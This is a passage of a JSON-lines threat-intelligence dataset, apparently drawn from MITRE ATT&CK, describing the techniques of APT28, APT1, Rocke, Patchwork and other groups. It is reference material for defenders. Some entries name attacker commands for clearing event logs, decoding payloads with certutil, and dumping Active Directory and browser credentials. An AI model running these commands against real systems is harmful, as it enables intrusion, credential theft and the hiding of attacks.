injection attacks against external websites.", "APT28 has changed extensions on files containing exfiltrated data to make them appear benign, and renamed a web shell instance to appear as a legitimate OWA page.", "APT28 uses a module to receive a notification every time a USB mass storage device is inserted into a victim.", "APT28 used a publicly available tool to gather and compress multiple documents on the DCCC and DNC networks.", "APT28 has used compromised Office 365 service accounts with Global Administrator privileges to collect email from user inboxes.", "APT28 has cleared event logs, including by using the commands <code>wevtutil cl System</code> and <code>wevtutil cl Security</code>.", "An APT28 macro uses the command <code>certutil -decode</code> to decode contents of a .txt file storing the base64 encoded payload.", "APT28 uses a tool to infect connected USB devices and transmit itself to air-gapped computers when the infected USB device is inserted.", "APT28 has used the WindowStyle parameter to conceal PowerShell windows. ", "APT28 has mapped network drives using Net and administrator credentials.", "APT28 has intentionally deleted computer files to cover their tracks, including with use of the program CCleaner.", "APT28 has exploited Microsoft Office vulnerability CVE-2017-0262 for execution.", "APT28 has collected files from various information repositories.", "APT28 has used spearphishing to compromise credentials.", "APT28 has used a brute-force/password-spray tooling that operated in two modes: in password-spraying mode it conducted approximately four authentication attempts per hour per targeted account over the course of several days or weeks. APT28 has also used a Kubernetes cluster to conduct distributed, large-scale password spray attacks.", "APT28 has split archived exfiltration files into chunks smaller than 1MB.", "An APT28 loader Trojan uses a cmd.exe and batch script to run its payload. The group has also used macros to execute payloads.", "APT28 used weaponized Microsoft Word documents abusing the remote template function to retrieve a malicious macro. ", "APT28 has used pass the hash for lateral movement.", "APT28 has used Forfiles to locate PDF, Excel, and Word documents during collection. The group also searched a compromised DCCC computer for specific terms.", "APT28 has exploited CVE-2014-4076, CVE-2015-2387, CVE-2015-1701, CVE-2017-0263 to escalate privileges.", "APT28 has used a Powershell cmdlet to grant the <code>ApplicationImpersonation</code> role to a compromised account.", "APT28 has performed large-scale scans in an attempt to find vulnerable servers.", "An APT28 loader Trojan will enumerate the victim's processes searching for explorer.exe if its current process does not have necessary permissions.", "APT28 has performed timestomping on victim files.", "APT28 has used the ntdsutil.exe utility to export the Active Directory database for credential access.", "APT28 has downloaded additional files, including by using a first-stage downloader to contact the C2 server to obtain the second-stage implant.", "APT28 has used port 443 for C2."], "is_subtechnique": false}
{"text": " [APT1](https://attack.mitre.org/groups/G0006) is a Chinese threat group that has been attributed to the 2nd Bureau of the People’s Liberation Army (PLA) General Staff Department’s (GSD) 3rd Department, commonly known by its Military Unit Cover Designator (MUCD) as Unit 61398. (Citation: Mandiant APT1)", "idx": "https://attack.mitre.org/groups/G0006", "title": "APT1", "entity": "APT1", "entity_type": "groups", "entity_context": ["APT1 has collected files from a local victim.", "APT1 has sent spearphishing emails containing malicious attachments.", "APT1 uses two utilities, GETMAIL and MAPIGET, to steal email. GETMAIL extracts emails from archived Outlook .pst files.", "APT1 used the commands <code>net start</code> and <code>tasklist</code> to get a listing of the services on the system.", "APT1 has used various open-source tools for privilege escalation purposes.", "APT1 used publicly available malware for privilege escalation.", "APT1 used the commands <code>net localgroup</code>,<code>net user</code>, and <code>net group</code> to find accounts on the system.", "APT1 hijacked FQDNs associated with legitimate websites hosted by hop points.", "APT1 used the <code>ipconfig /all</code> command to gather network configuration information.", "APT1 used the <code>net use</code> command to get a listing on network connections.", "APT1 has registered hundreds of domains for use in operations.", "APT1 listed connected network shares.", "APT1 has sent spearphishing emails containing hyperlinks to malicious files.", "The APT1 group is known to have used RDP during operations.", "APT1 used a batch script to perform a series of discovery techniques and saves it to a text file.", "APT1 gathered a list of running processes on the system using <code>tasklist /v</code>.", "APT1 has been known to use credential dumping using Mimikatz.", "The file name AcroRD32.exe, a legitimate process name for Adobe's Acrobat Reader, was used by APT1 as a name for malware.", "APT1 uses two utilities, GETMAIL and MAPIGET, to steal email. MAPIGET steals email still on Exchange servers that has not yet been archived.", "APT1 has created email accounts for later use in social engineering, phishing, and when registering domains.", "APT1 has used RAR to compress files before moving them outside of the victim network.", "APT1 has used the Windows command shell to execute commands, and batch scripting to automate execution.", "The APT1 group is known to have used pass the hash."], "is_subtechnique": false}
{"text": " [admin@338](https://attack.mitre.org/groups/G0018) is a China-based cyber threat group. It has previously used newsworthy events as lures to deliver malware and has primarily targeted organizations involved in financial, economic, and trade policy, typically using publicly available RATs such as [PoisonIvy](https://attack.mitre.org/software/S0012), as well as some non-public backdoors. (Citation: FireEye admin@338)", "idx": "https://attack.mitre.org/groups/G0018", "title": "admin@338", "entity": "admin@338", "entity_type": "groups", "entity_context": ["admin@338 actors used the following commands after exploiting a machine with LOWBALL malware to obtain information about files and directories: <code>dir c:\\ >> %temp%\\download</code> <code>dir \"c:\\Documents and Settings\" >> %temp%\\download</code> <code>dir \"c:\\Program Files\\\" >> %temp%\\download</code> <code>dir d:\\ >> %temp%\\download</code>", "admin@338 actors used the following command to rename one of their tools to a benign file name: <code>ren \"%temp%\\upload\" audiodg.exe</code>", "Following exploitation with LOWBALL malware, admin@338 actors created a file containing a list of commands to be executed on the compromised computer.", "admin@338 has sent emails with malicious Microsoft Office documents attached.", "admin@338 actors used the following command following exploitation of a machine with LOWBALL malware to display network connections: <code>netstat -ano >> %temp%\\download</code>", "admin@338 actors used the following command following exploitation of a machine with LOWBALL malware to list local groups: <code>net localgroup administrator >> %temp%\\download</code>", "admin@338 has attempted to get victims to launch malicious Microsoft Word attachments delivered via spearphishing emails.", "admin@338 actors used the following command after exploiting a machine with LOWBALL malware to acquire information about local networks: <code>ipconfig /all >> %temp%\\download</code>", "admin@338 actors used the following command following exploitation of a machine with LOWBALL malware to obtain information about services: <code>net start >> %temp%\\download</code>", "admin@338 actors used the following commands after exploiting a machine with LOWBALL malware to obtain information about the OS: <code>ver >> %temp%\\download</code> <code>systeminfo >> %temp%\\download</code>", "admin@338 actors used the following commands following exploitation of a machine with LOWBALL malware to enumerate user accounts: <code>net user >> %temp%\\download</code> <code>net user /domain >> %temp%\\download</code>", "admin@338 has exploited client software vulnerabilities for execution, such as Microsoft Word CVE-2012-0158."], "is_subtechnique": false}
{"text": " [Rocke](https://attack.mitre.org/groups/G0106) is an alleged Chinese-speaking adversary whose primary objective appeared to be cryptojacking, or stealing victim system resources for the purposes of mining cryptocurrency. The name [Rocke](https://attack.mitre.org/groups/G0106) comes from the email address \"rocke@live.cn\" used to create the wallet which held collected cryptocurrency. Researchers have detected overlaps between [Rocke](https://attack.mitre.org/groups/G0106) and the Iron Cybercrime Group, though this attribution has not been confirmed.(Citation: Talos Rocke August 2018)", "idx": "https://attack.mitre.org/groups/G0106", "title": "Rocke", "entity": "Rocke", "entity_type": "groups", "entity_context": ["Rocke has extracted tar.gz files after downloading them from a C2 server.", "Rocke's miner connects to a C2 server using port 51640.\t", "Rocke can detect a running process's PID on the infected machine.\t", "Rocke has deleted files on infected machines.\t", "Rocke has changed file permissions of files so they could not be modified.\t", "Rocke has changed the time stamp of certain files.\t", "Rocke installed a cron job that downloaded and executed files from the C2.", "Rocke has modified /etc/ld.so.preload to hook libc functions in order to hide the installed dropper and mining software in process lists.", "Rocke has cleared log files within the /var/log/ folder.", "Rocke issued wget requests from infected systems to the C2.", "Rocke's miner has created UPX-packed files in the Windows Start Menu Folder.", "Rocke has modified /etc/ld.so.preload to hook libc functions in order to hide the installed dropper and mining software in process lists.\t", "Rocke used shell scripts to run commands which would obtain persistence and execute the cryptocurrency mining malware.\t", "Rocke's miner has created UPX-packed files in the Windows Start Menu Folder.\t", "Rocke has executed wget and curl commands to Pastebin over the HTTPS protocol.", "Rocke used scripts which killed processes and added firewall rules to block traffic related to other cryptominers.\t", "Rocke's miner, \"TermsHost.exe\", evaded defenses by injecting itself into Windows processes, including Notepad.exe.\t", "Rocke has compiled malware, delivered to victims as .c files, with the GNU Compiler Collection (GCC).\t", "Rocke downloaded a file \"libprocesshider\", which could hide files on the target system.", "Rocke has used Pastebin to check the version of beaconing malware and redirect to another Pastebin hosting updated malware.", "Rocke has modified UPX headers after packing files to break unpackers.", "Rocke used scripts which detected and uninstalled antivirus software.", "Rocke conducted scanning for exposed TCP port 7001 as well as SSH and Redis servers.", "Rocke has installed a systemd service script to maintain persistence.\t", "Rocke exploited Apache Struts, Oracle WebLogic (CVE-2017-10271), and Adobe ColdFusion (CVE-2017-3066) vulnerabilities to deliver malware.", "Rocke has looked for IP addresses in the known_hosts file on the infected system and attempted to SSH into them.\t", "Rocke has installed an \"init.d\" startup script to maintain persistence.\t", "Rocke has used SSH private keys on the infected machine to spread its coinminer throughout a network.", "Rocke has spread its coinminer via SSH.\t", "Rocke used malware to download additional malicious files to the target system.\t", "Rocke has used Pastebin, Gitee, and GitLab for Command and Control.", "Rocke has used shell scripts which download mining executables and saves them with the filename \"java\".", "Rocke has used uname -m to collect the name and information about the infected system's kernel.", "Rocke has distributed cryptomining malware.", "Rocke has used Python-based malware to install and spread their coinminer."], "is_subtechnique": false}
{"text": " [Blue Mockingbird](https://attack.mitre.org/groups/G0108) is a cluster of observed activity involving Monero cryptocurrency-mining payloads in dynamic-link library (DLL) form on Windows systems. The earliest observed Blue Mockingbird tools were created in December 2019.(Citation: RedCanary Mockingbird May 2020)", "idx": "https://attack.mitre.org/groups/G0108", "title": "Blue Mockingbird", "entity": "Blue Mockingbird", "entity_type": "groups", "entity_context": ["Blue Mockingbird has used Mimikatz to retrieve credentials from LSASS memory.", "Blue Mockingbird has masqueraded their XMRIG payload name by naming it wercplsupporte.dll after the legitimate wercplsupport.dll file.", "Blue Mockingbird has used PowerShell reverse TCP shells to issue interactive commands over a network connection.", "Blue Mockingbird has used Windows Registry modifications to specify a DLL payload.\t", "Blue Mockingbird has executed custom-compiled XMRIG miner DLLs by configuring them to execute via the \"wercplsupport\" service.\t", "Blue Mockingbird has gained initial access by exploiting CVE-2019-18935, a vulnerability within Telerik UI for ASP.NET AJAX.", "Blue Mockingbird has used wmic.exe to set environment variables.", "Blue Mockingbird has executed custom-compiled XMRIG miner DLLs using rundll32.exe.", "Blue Mockingbird has obtained and used tools such as Mimikatz.", "Blue Mockingbird has executed custom-compiled XMRIG miner DLLs using regsvr32.exe.\t", "Blue Mockingbird has collected hardware details for the victim's system, including CPU and memory information.", "Blue Mockingbird has used JuicyPotato to abuse the <code>SeImpersonate</code> token privilege to escalate from web application pool accounts to NT Authority\\SYSTEM.", "Blue Mockingbird has used Windows Explorer to manually copy malicious files to remote hosts over SMB.", "Blue Mockingbird has used wmic.exe and Windows Registry modifications to set the COR_PROFILER environment variable to execute a malicious DLL whenever a process loads the .NET CLR.", "Blue Mockingbird has used frp, ssf, and Venom to establish SOCKS proxy connections.", "Blue Mockingbird has used XMRIG to mine cryptocurrency on victim systems.", "Blue Mockingbird has obfuscated the wallet address in the payload binary.", "Blue Mockingbird has used batch script files to automate execution and deployment of payloads.", "Blue Mockingbird has made their XMRIG payloads persistent as a Windows Service.", "Blue Mockingbird has used Windows Scheduled Tasks to establish persistence on local and remote hosts.", "Blue Mockingbird has used Remote Desktop to log on to servers interactively and manually copy files to remote hosts.", "Blue Mockingbird has used mofcomp.exe to establish WMI Event Subscription persistence mechanisms configured from a *.mof file."], "is_subtechnique": false}
{"text": " [APT17](https://attack.mitre.org/groups/G0025) is a China-based threat group that has conducted network intrusions against U.S. government entities, the defense industry, law firms, information technology companies, mining companies, and non-government organizations. (Citation: FireEye APT17)", "idx": "https://attack.mitre.org/groups/G0025", "title": "APT17", "entity": "APT17", "entity_type": "groups", "entity_context": ["APT17 has created and cultivated profile pages in Microsoft TechNet. To make profile pages appear more legitimate, APT17 has created biographical sections and posted in forum threads.", "APT17 has created profile pages in Microsoft TechNet that were used as C2 infrastructure."], "is_subtechnique": false}
{"text": " [Taidoor](https://attack.mitre.org/groups/G0015) has been deprecated, as the only technique it was linked to was deprecated in ATT&CK v7.", "idx": "https://attack.mitre.org/groups/G0015", "title": "Taidoor", "entity": "Taidoor", "entity_type": "groups", "entity_context": [], "is_subtechnique": false}
{"text": " [IndigoZebra](https://attack.mitre.org/groups/G0136) is a suspected Chinese cyber espionage group that has been targeting Central Asian governments since at least 2014.(Citation: HackerNews IndigoZebra July 2021)(Citation: Checkpoint IndigoZebra July 2021)(Citation: Securelist APT Trends Q2 2017)", "idx": "https://attack.mitre.org/groups/G0136", "title": "IndigoZebra", "entity": "IndigoZebra", "entity_type": "groups", "entity_context": ["IndigoZebra has compromised legitimate email accounts to use in their spearphishing operations.", "IndigoZebra has downloaded additional files and tools from its C2 server.", "IndigoZebra has acquired open source tools such as NBTscan and Meterpreter for their operations. ", "IndigoZebra has established domains, some of which were designed to look like official government domains, for their operations.", "IndigoZebra sent spearphishing emails containing malicious attachments that urged recipients to review modifications in the file which would trigger the attack.", "IndigoZebra sent spearphishing emails containing malicious password-protected RAR attachments.", "IndigoZebra created Dropbox accounts for their operations."], "is_subtechnique": false}
{"text": " [Patchwork](https://attack.mitre.org/groups/G0040) is a cyberespionage group that was first observed in December 2015. While the group has not been definitively attributed, circumstantial evidence suggests the group may be a pro-Indian or Indian entity. [Patchwork](https://attack.mitre.org/groups/G0040) has been seen targeting industries related to diplomatic and government agencies. Much of the code used by this group was copied and pasted from online forums. [Patchwork](https://attack.mitre.org/groups/G0040) was also seen operating spearphishing campaigns targeting U.S. think tank groups in March and April of 2018. (Citation: Cymmetria Patchwork) (Citation: Symantec Patchwork) (Citation: TrendMicro Patchwork Dec 2017) (Citation: Volexity Patchwork June 2018)", "idx": "https://attack.mitre.org/groups/G0040", "title": "Patchwork", "entity": "Patchwork", "entity_type": "groups", "entity_context": ["Patchwork developed a file stealer to search C:\\ and collect files with certain extensions. Patchwork also executed a script to enumerate all drives, store them as a list, and upload generated files to the C2 server.", "A Patchwork payload deletes Resiliency Registry keys created by Microsoft Office applications in an apparent effort to trick users into thinking there were no issues during application runs.", "Patchwork has obtained and used open-source tools such as QuasarRAT.", "Patchwork collected the victim computer name, OS version, and architecture type and sent the information to its C2 server. Patchwork also enumerated all available drives on the victim's machine.", "Patchwork embedded a malicious macro in a Word document and lured the victim to click on an icon to execute the malware.", "Patchwork has used watering holes to deliver files with exploits to initial victims.", "Patchwork has added the path of its second-stage malware to the startup folder to achieve persistence. One of its file stealers has also persisted by adding a Registry Run key.", "Patchwork has used spearphishing with links to try to get users to click, download and open malicious files.", "A Patchwork payload uses process hollowing to hide the UAC bypass vulnerability exploitation inside svchost.exe.", "Patchwork bypassed User Access Control (UAC).", "Patchwork has used spearphishing with an attachment to deliver files with exploits to initial victims.", "A Patchwork file stealer can run a TaskScheduler DLL to add persistence.", "Patchwork used Base64 to encode C2 traffic.", "Patchwork has used BITS jobs to download malicious payloads.", "Patchwork ran a reverse shell with Meterpreter. Patchwork used JavaScript code and .SCT files on victim machines.", "Patchwork has signed malware with self-signed certificates from fictitious and spoofed legitimate software companies.", "Patchwork scanned the “Program Files” directories for a directory with the string “Total Security” (the installation path of the “360 Total Security” antivirus tool).", "Patchwork has used spearphishing with links to deliver files with exploits to initial victims. The group has also used embedded image tags (known as web bugs) with unique, per-recipient tracking links in their emails for the purpose of identifying which recipients opened messages.", "Patchwork copied all targeted files to a directory called index that was eventually uploaded to the C&C server.", "Patchwork used PowerSploit to download payloads, run a reverse shell, and execute malware on the victim's machine.", "Patchwork has created self-signed certificates from fictitious and spoofed legitimate software companies that were later used to sign malware.", "Patchwork collected and exfiltrated files from the infected system.", "Patchwork uses malicious documents to deliver remote execution exploits as part of. The group has previously exploited CVE-2017-8570, CVE-2012-1856, CVE-2014-4114, CVE-2017-0199, CVE-2017-11882, and CVE-2015-1641.", "Patchwork leveraged the DDE protocol to deliver their malware.", "Patchwork attempted to use RDP to move laterally.", "A Patchwork payload has searched all fixed drives on the victim for files matching a specified list of extensions.", "Patchwork dumped the login data database from <code>\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data</code>.", "Patchwork has obfuscated a script with Crypto Obfuscator.", "Patchwork used Visual Basic Scripts (VBS) on victim machines.", "Patchwork installed its payload in the startup programs folder as \"Baidu Software Update.\" The group also adds its second stage payload to the startup programs as “Net Monitor.\" They have also dropped QuasarRAT binaries as files named microsoft_network.exe and crome.exe.", "A Patchwork payload was packed with UPX.", "Patchwork collected the victim username and whether it was running as admin, then sent the information to its C2 server.", "Patchwork apparently altered NDiskMonitor samples by adding four bytes of random letters in a likely attempt to change the file hashes.", "A Patchwork .dll that contains BADNEWS is loaded and executed using DLL side-loading.", "Patchwork encrypted the collected files' path with AES and then encoded them with base64.", "Patchwork removed certain files and replaced them so they could not be retrieved.", "Patchwork hides base64-encoded and encrypted C2 server locations in comments on legitimate websites.", "Patchwork payloads download additional files from the C2 server."], "is_subtechnique": false}
{"text": " [Transparent Tribe](https://attack.mitre.org/groups/G0134) is a suspected Pakistan-based threat group that has been active since at least 2013, primarily targeting diplomatic, defense, and research organizations in India and Afghanistan.(Citation: Proofpoint Operation Transparent Tribe March 2016)(Citation: Kaspersky Transparent Tribe August 2020)(Citation: Talos Transparent Tribe May 2021)", "idx": "https://attack.mitre.org/groups/G0134", "title": "Transparent Tribe", "entity": "Transparent Tribe", "entity_type": "groups", "entity_context": ["Transparent Tribe has sent spearphishing e-mails with attachments to deliver malicious payloads.\t ", "Transparent Tribe has embedded links to malicious downloads in e-mails.", "Transparent Tribe has directed users to open URLs hosting malicious content.", "Transparent Tribe has used websites with malicious hyperlinks and iframes to infect targeted victims with Crimson, njRAT, and other malicious tools.", "Transparent Tribe has used dynamic DNS services to set up C2.", "Transparent Tribe has dropped encoded executables on compromised hosts.", "Transparent Tribe has crafted malicious files to exploit CVE-2012-0158 and CVE-2010-3333 for execution.", "Transparent Tribe has registered domains to mimic file sharing, government, defense, and research websites for use in targeted campaigns.", "Transparent Tribe has crafted VBS-based malicious documents.\t ", "Transparent Tribe has set up websites with malicious hyperlinks and iframes to infect targeted victims with Crimson, njRAT, and other malicious tools.", "Transparent Tribe has compromised domains for use in targeted malicious campaigns.", "Transparent Tribe has used weaponized documents in e-mail to compromise targeted systems.", "Transparent Tribe can hide legitimate directories and replace them with malicious copies of the same name.", "Transparent Tribe can mimic legitimate Windows directories by using the same icons and names."], "is_subtechnique": false}
{"text": " [Honeybee](https://attack.mitre.org/groups/G0072) is a campaign led by an unknown actor that targets humanitarian aid organizations and has been active in Vietnam, Singapore, Argentina, Japan, Indonesia, and Canada. It has been an active operation since August of 2017 and as recently as February 2018. (Citation: McAfee Honeybee)", "idx": "https://attack.mitre.org/groups/G0072", "title": "Honeybee", "entity": "Honeybee", "entity_type": "groups", "entity_context": ["Honeybee uses a dropper called MaoCheng that harvests a stolen digital signature from Adobe Systems.", "Honeybee gathers computer name and information using the <code>systeminfo</code> command.", "Honeybee uses a batch file that modifies Registry keys to launch a DLL into the svchost.exe process.", "Honeybee has batch files that modify the system service COMSysApp to load a malicious DLL.", "Honeybee drops files with base64-encoded data.", "Honeybee's service-based DLL implant traverses the FTP server’s directories looking for files with keyword matches for computer names or certain keywords.", "Several commands are supported by the Honeybee's implant via the command-line interface and there’s also a utility to execute any custom command on an infected endpoint. Honeybee used batch scripting.", "Honeybee uses a batch file to load a DLL into the svchost.exe process.", "Honeybee removes batch files to reduce fingerprint on the system as well as deletes the CAB file that gets encoded upon infection.", "Honeybee gathers a list of processes using the <code>tasklist</code> command and then is sent back to the control server.", "Honeybee performs data exfiltration is accomplished through the following command-line command: <code>from <COMPUTER-NAME> (<Month>-<Day> <Hour>-<Minute>-<Second>).txt</code>.", "Honeybee uses FTP for command and control.", "Honeybee drops a Word file containing a Base64-encoded file in it that is read, decoded, and dropped to the disk by the macro.", "Honeybee uses a batch file that configures the ComSysApp service to autostart in order to establish persistence.", "Honeybee uses a combination of NTWDBLIB.dll and cliconfg.exe to bypass UAC protections using DLL hijacking.", "Honeybee adds collected files to a temp.zip file saved in the %temp% folder, then base64 encodes it and uploads it to control server.", "Honeybee's service-based DLL implant can execute a downloaded file with parameters specified using <code>CreateProcessAsUser</code>.", "Honeybee embeds a Visual Basic script within a malicious Word document as part of initial access; the script is executed when the Word document is opened.", "Honeybee launches a DLL file that gets executed as a service using svchost.exe", "Honeybee collects data from the local victim system."], "is_subtechnique": false}
{"text": " [Threat Group-1314](https://attack.mitre.org/groups/G0028) is an unattributed threat group that has used compromised credentials to log into a victim's remote access infrastructure. (Citation: Dell TG-1314)", "idx": "https://attack.mitre.org/groups/G0028", "title": "Threat Group-1314", "entity": "Threat Group-1314", "entity_type": "groups", "entity_context": ["Threat Group-1314 actors spawned shells on remote systems on a victim network to execute commands.", "Threat Group-1314 actors used compromised domain credentials for the victim's endpoint management platform, Altiris, to move laterally.", "Threat Group-1314 actors mapped network drives using <code>net use</code>.", "Threat Group-1314 actors used a victim's endpoint management platform, Altiris, for lateral movement."], "is_subtechnique": false}
{"text": " [DarkHydrus](https://attack.mitre.org/groups/G0079) is a threat group that has targeted government agencies and educational institutions in the Middle East since at least 2016. The group heavily leverages open-source tools and custom payloads for carrying out attacks. (Citation: Unit 42 DarkHydrus July 2018) (Citation: Unit 42 Playbook Dec 2017)", "idx": "https://attack.mitre.org/groups/G0079", "title": "DarkHydrus", "entity": "DarkHydrus", "entity_type": "groups", "entity_context": ["DarkHydrus has used <code>-WindowStyle Hidden</code> to conceal PowerShell windows. ", "DarkHydrus has obtained and used tools such as Mimikatz, Empire, and Cobalt Strike.", "DarkHydrus used an open-source tool, Phishery, to inject malicious remote template URLs into Microsoft Word documents and then sent them to victims to enable Forced Authentication.", "DarkHydrus used Template Injection to launch an authentication window for users to enter their credentials.", "DarkHydrus leveraged PowerShell to download and execute additional scripts for execution.", "DarkHydrus has sent malware that required users to hit the enable button in Microsoft Excel to allow an .iqy file to be downloaded.", "DarkHydrus has sent spearphishing emails with password-protected RAR archives containing malicious Excel Web Query files (.iqy). The group has also sent spearphishing emails that contained malicious Microsoft Office documents that use the “attachedTemplate” technique to load a template from a remote server."], "is_subtechnique": false}
{"text": " [RTM](https://attack.mitre.org/groups/G0048) is a cybercriminal group that has been active since at least 2015 and is primarily interested in users of remote banking systems in Russia and neighboring countries. The group uses a Trojan by the same name ([RTM](https://attack.mitre.org/software/S0148)). (Citation: ESET RTM Feb 2017)", "idx": "https://attack.mitre.org/groups/G0048", "title": "RTM", "entity": "RTM", "entity_type": "groups", "entity_context": ["RTM has used spearphishing attachments to distribute its malware.", "RTM has attempted to lure victims into opening e-mail attachments to execute malicious code.", "RTM has used search order hijacking to force TeamViewer to load a malicious DLL.", "RTM has used an RSS feed on Livejournal to update a list of encrypted C2 server names.", "RTM has used Registry run keys to establish persistence for the RTM Trojan and other tools, such as a modified version of TeamViewer remote desktop software.", "RTM has used a modified version of TeamViewer and Remote Utilities for remote access.", "RTM has distributed its malware via the RIG and SUNDOWN exploit kits, as well as online advertising network <code>Yandex.Direct</code>."], "is_subtechnique": false}
{"text": " [Putter Panda](https://attack.mitre.org/groups/G0024) is a Chinese threat group that has been attributed to Unit 61486 of the 12th Bureau of the PLA’s 3rd General Staff Department (GSD). (Citation: CrowdStrike Putter Panda)", "idx": "https://attack.mitre.org/groups/G0024", "title": "Putter Panda", "entity": "Putter Panda", "entity_type": "groups", "entity_context": ["Malware used by Putter Panda attempts to terminate processes corresponding to two components of Sophos Anti-Virus (SAVAdminService.exe and SavService.exe).", "An executable dropped onto victims by Putter Panda aims to inject the specified DLL into a process that would normally be accessing the network, including Outlook Express (msinm.exe), Outlook (outlook.exe), Internet Explorer (iexplore.exe), and Firefox (firefox.exe).", "Droppers used by Putter Panda use RC4 or a 16-byte XOR key consisting of the bytes 0xA0 – 0xAF to obfuscate payloads.", "A dropper used by Putter Panda installs itself into the ASEP Registry key <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code> with a value named McUpdate."], "is_subtechnique": false}
{"text": " [APT30](https://attack.mitre.org/groups/G0013) is a threat group suspected to be associated with the Chinese government. While [Naikon](https://attack.mitre.org/groups/G0019) shares some characteristics with [APT30](https://attack.mitre.org/groups/G0013), the two groups do not appear to be exact matches.(Citation: FireEye APT30)(Citation: Baumgartner Golovkin Naikon 2015)", "idx": "https://attack.mitre.org/groups/G0013", "title": "APT30", "entity": "APT30", "entity_type": "groups", "entity_context": ["APT30 has relied on users to execute malicious file attachments delivered via spearphishing emails.", "APT30 has used spearphishing emails with malicious DOC attachments."], "is_subtechnique": false}
{"text": " [Ke3chang](https://attack.mitre.org/groups/G0004) is a threat group attributed to actors operating out of China. [Ke3chang](https://attack.mitre.org/groups/G0004) has targeted several industries, including oil, government, military, and more.(Citation: Mandiant Operation Ke3chang November 2014)(Citation: NCC Group APT15 Alive and Strong)(Citation: APT15 Intezer June 2018)", "idx": "https://attack.mitre.org/groups/G0004", "title": "Ke3chang", "entity": "Ke3chang", "entity_type": "groups", "entity_context": ["Ke3chang performs service discovery using <code>net start</code> commands.", "Ke3chang performs operating system information discovery using <code>systeminfo</code>.", "Ke3chang uses command-line interaction to search files and directories.", "Ke3chang has used a tool known as RemoteExec (similar to PsExec) to remotely execute batch scripts and binaries.", "Ke3chang has used keyloggers.", "Ke3chang performs local network connection discovery using <code>netstat</code>.", "Ke3chang backdoor RoyalDNS established persistence through adding a service called <code>Nwsapagent</code>.", "Ke3chang regained access after eviction via the corporate VPN solution with a stolen VPN certificate, which they had extracted from a compromised host.", "Ke3chang has used batch scripts in its malware to install persistence mechanisms.", "Ke3chang gathered information and files from local directories for exfiltration.", "Ke3chang used a SharePoint enumeration and data dumping tool known as spwebmember.", "Several Ke3chang backdoors achieved persistence by adding a Run key.", "Malware used by Ke3chang can run commands on the command-line interface.", "Ke3chang has used network scanning and enumeration tools, including Ping.", "Ke3chang used a .NET tool to dump data from Microsoft Exchange mailboxes.", "Ke3chang malware RoyalDNS has used DNS for C2.", "Ke3chang performs process discovery using <code>tasklist</code> commands.", "Ke3chang malware RoyalCli and BS2005 have communicated over HTTP with the C2 server through Internet Explorer (IE) by using the COM interface IWebBrowser2.", "Ke3chang transferred compressed and encrypted RAR files containing exfiltration through the established backdoor command and control channel during operations.", "Ke3chang performs account discovery using commands such as <code>net localgroup administrators</code> and <code>net group \"REDACTED\" /domain</code> on specific permissions groups.", "Ke3chang actors have been known to copy files to the network shares of other computers to move laterally.", "Ke3chang has dumped credentials, including by using Mimikatz.", "Ke3chang performs local network configuration discovery using <code>ipconfig</code>.", "Ke3chang has used Mimikatz to generate Kerberos golden tickets.", "The Ke3chang group has been known to compress data before exfiltration.", "Ke3chang is known to use RAR with passwords to encrypt data prior to exfiltration.", "Ke3chang has used the right-to-left override character in spearphishing attachment names to trick targets into executing .scr and .exe files.", "Ke3chang has obtained and used tools such as Mimikatz.", "Ke3chang has dumped credentials, including by using gsecdump.", "Ke3chang performs discovery of permission groups <code>net group /domain</code>."], "is_subtechnique": false}
{"text": " [Scarlet Mimic](https://attack.mitre.org/groups/G0029) is a threat group that has targeted minority rights activists. This group has not been directly linked to a government source, but the group's motivations appear to overlap with those of the Chinese government. While there is some overlap between IP addresses used by [Scarlet Mimic](https://attack.mitre.org/groups/G0029) and [Putter Panda](https://attack.mitre.org/groups/G0024), it has not been concluded that the groups are the same. (Citation: Scarlet Mimic Jan 2016)", "idx": "https://attack.mitre.org/groups/G0029", "title": "Scarlet Mimic", "entity": "Scarlet Mimic", "entity_type": "groups", "entity_context": ["Scarlet Mimic has used the left-to-right override character in self-extracting RAR archive spearphishing attachment file names."], "is_subtechnique": false}
{"text": " [APT19](https://attack.mitre.org/groups/G0073) is a Chinese-based threat group that has targeted a variety of industries, including defense, finance, energy, pharmaceutical, telecommunications, high tech, education, manufacturing, and legal services. In 2017, a phishing campaign was used to target seven law and investment firms. (Citation: FireEye APT19) Some analysts track [APT19](https://attack.mitre.org/groups/G0073) and [Deep Panda](https://attack.mitre.org/groups/G0009) as the same group, but it is unclear from open source information if the groups are the same. (Citation: ICIT China's Espionage Jul 2016) (Citation: FireEye APT Groups) (Citation: Unit 42 C0d0so0 Jan 2016)", "idx": "https://attack.mitre.org/groups/G0073", "title": "APT19", "entity": "APT19", "entity_type": "groups", "entity_context": ["APT19 used an HTTP malware variant and a Port 22 malware variant to collect the victim’s username.", "APT19 performed a watering hole attack on forbes.com in 2014 to compromise targets.", "APT19 used TCP port 80 for C2.", "An APT19 HTTP malware variant establishes persistence by setting the Registry key <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Windows Debug Tools-%LOCALAPPDATA%\\</code>.", "An APT19 Port 22 malware variant registers itself as a service.", "An APT19 HTTP malware variant decrypts strings using single-byte XOR keys.", "APT19 used an HTTP malware variant and a Port 22 malware variant to collect the MAC address and IP address from the victim’s machine.", "APT19 used Regsvr32 to bypass application control techniques.", "APT19 used Base64 to obfuscate commands and the payload.", "APT19 attempted to get users to launch malicious attachments delivered via spearphishing emails.", "APT19 used HTTP for C2 communications. APT19 also used an HTTP malware variant to communicate over HTTP for C2.", "APT19 launched an HTTP malware variant and a Port 22 malware variant using a legitimate executable that loaded the malicious DLL.", "APT19 collected system architecture information. APT19 used an HTTP malware variant and a Port 22 malware variant to gather the hostname and CPU information from the victim’s machine.", "APT19 has obtained and used publicly-available tools like Empire.", "APT19 sent spearphishing emails with malicious attachments in RTF and XLSM formats to deliver initial exploits.", "APT19 downloaded and launched code within a SCT file.", "APT19 used <code>-W Hidden</code> to conceal PowerShell windows by setting the WindowStyle parameter to hidden. ", "An APT19 HTTP malware variant used Base64 to encode communications to the C2 server.", "APT19 uses a Port 22 malware variant to modify several Registry keys.", "APT19 used PowerShell commands to execute payloads.", "APT19 configured its payload to inject into the rundll32.exe."], "is_subtechnique": false}
